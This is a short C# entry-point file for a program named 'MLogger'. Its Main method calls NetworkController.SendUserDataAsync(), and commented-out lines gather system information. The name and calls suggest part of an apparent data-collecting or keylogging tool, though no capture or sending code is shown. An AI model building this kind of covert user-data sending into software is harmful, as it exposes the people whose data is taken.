using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Linq;

namespace MLogger
{
    class Program
    {
        public static void Main()
        {
            NetworkController.SendUserDataAsync();
            Console.ReadLine();
            //Console.WriteLine(SystemDetails.GetSystemInfo());
            ///new MLogger();
        }
    }
}
